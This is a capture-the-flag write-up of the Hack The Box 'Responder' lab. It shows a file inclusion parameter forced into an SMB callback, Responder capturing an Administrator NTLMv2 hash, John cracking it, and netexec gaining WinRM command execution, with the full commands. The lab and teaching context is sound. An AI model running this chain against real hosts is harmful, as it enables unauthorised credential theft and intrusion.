---
layout: post
title: "HTB Responder"
date: 2026-07-11
category: "HTB Writeups"
difficulty: "Very Easy"
tags: [windows, responder, ntlm, winrm, john, starting-point]
excerpt: "File inclusion coerces a Windows host into leaking its NTLMv2 hash. Crack it with John, log in over WinRM. Plus the hash-formatting and Ruby gem battles that nearly ended me."
---

> Starting Point box, but the most real one so far. It's the classic "coerce a
> Windows host into authenticating to you, capture the hash, crack it, log in"
> chain that shows up constantly in AD work. Technique first, no flags. Two things
> nearly broke me here: hash formatting and Ruby gem hell.

## Recon

```
sudo nmap -sC -sV 10.129.x.x
```

| Port | Service | Version                           |
| ---- | ------- | --------------------------------- |
| 80   | HTTP    | Apache 2.4.52 (Win64) PHP/8.1.1   |
| 5985 | HTTP    | Microsoft HTTPAPI 2.0 (WinRM)     |

Windows host (`OS: Windows` in the scan). Port 80 is the way in, and 5985 is WinRM, which is how I'll come back once I have credentials. The site redirects to a `.htb` hostname, so first job is `/etc/hosts`:

```
echo "10.129.x.x  unika.htb" | sudo tee -a /etc/hosts
```

## Enumeration and the vuln

The site's `page` parameter (`?page=french.html`) loads whatever file you name and doesn't restrict it, which is a file inclusion bug. On Windows, a path starting with `//` is a UNC/SMB network path, so I can point the server at my machine.

The chain:

1. Windows auto-authenticates when it opens an SMB share (that's normal file-share behaviour), leaking an NTLMv2 hash in the process.
2. Responder sits on my `tun0` interface pretending to be that SMB server and captures the hash.

```
sudo responder -I tun0
```

Then coerce the box into connecting back, in the browser:

```
http://unika.htb/?page=//10.10.x.x/test
```

Responder catches the `Administrator` NTLMv2 hash. From here it's all offline.

## Foothold: crack the hash

> **Struggle #1: hash formatting.** This ate a genuinely embarrassing amount of
> time. I kept copying the hash out of the scrolling terminal and grabbing only
> the tail (`8bfeb...:D50D1EFF...`), missing the mandatory
> `Administrator::MACHINE:` prefix. John then misdetected it as `LM`, loaded it
> wrong, and cracked nothing. A NetNTLMv2 hash is
> `USER::MACHINE:challenge:response:blob`. All five parts, or it's garbage.
>
> The fix: don't copy from the terminal. Responder writes every capture to disk,
> perfectly formatted:
> `cat /usr/share/responder/logs/SMB-NTLMv2-SSP-<ip>.txt`

```
# grab the full line from the log, save it, then:
john hash.txt --format=netntlmv2 --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
# Loaded 1 password hash (netntlmv2, NTLMv2 C/R)
# <password>   (Administrator)
```

Forcing `--format=netntlmv2` stops John guessing. It cracks in about a second once the hash is actually valid.

## Access: WinRM with the cracked creds

5985 is open, so the recovered `Administrator` password gets a full remote shell.

> **Struggle #2: Ruby dependency hell.** The "recommended" tool, `evil-winrm`, is a
> Ruby gem, and on Arch with Ruby 3.4 it's a nightmare. 3.4 dropped a pile of
> formerly-bundled gems, so `evil-winrm` failed one missing gem at a time: `csv`,
> `syslog`, `bigdecimal`, `rubyzip` (which needs `~> 2.0`, not latest), and on it
> went, whack-a-mole. A `sudo gem install` also lands gems in root's GEM_PATH where
> the user-run tool can't see them, which caused a "gem installed but not found" loop.

What actually worked was ditching Ruby entirely and using netexec (Python):

```
# AUR install resolved cleanly where pipx choked:
yay -S netexec

# one-shot: authenticate over WinRM and run a command
nxc winrm 10.129.x.x -u Administrator -p '<password>' -x "whoami"
# [+] Administrator:<password> (Pwn3d!)
```

`Pwn3d!` means admin access confirmed. `evil-winrm-py` (pipx) is the clean interactive alternative if you want a full shell.

## Finding the flag

Administrator's Desktop was empty. A recursive search across all profiles found it:

```
nxc winrm 10.129.x.x -u Administrator -p '<password>' -x "cmd /c dir /s /b C:\Users\*.txt"
# ...\Users\mike\Desktop\flag.txt
```

It lived on a different user's desktop, which is a good reminder not to assume the flag is where you first look.

## Takeaways

- This is the attack worth internalising. If you can make a Windows box connect to a server you control, it leaks credentials. LFI is just one trigger, there are many. Responder, capture, crack, WinRM is a pattern I'll see again and again.
- Never copy hashes from a scrolling terminal. Use Responder's log file. A NetNTLMv2 hash needs all five `USER::MACHINE:challenge:response:blob` parts, and `--format=netntlmv2` saves John from guessing.
- On Arch, skip Ruby `evil-winrm`. `netexec` (`nxc`) and `evil-winrm-py` are Python and just work. Install `netexec`, `impacket`, and `evil-winrm-py` and never fight a gem again. Also run `gem install` without sudo, or gems hide in root's path.
- Tooling failure isn't system breakage. I removed and reinstalled a lot tonight and panicked once, but nothing was actually broken. Removing an app and its unused deps is normal maintenance.
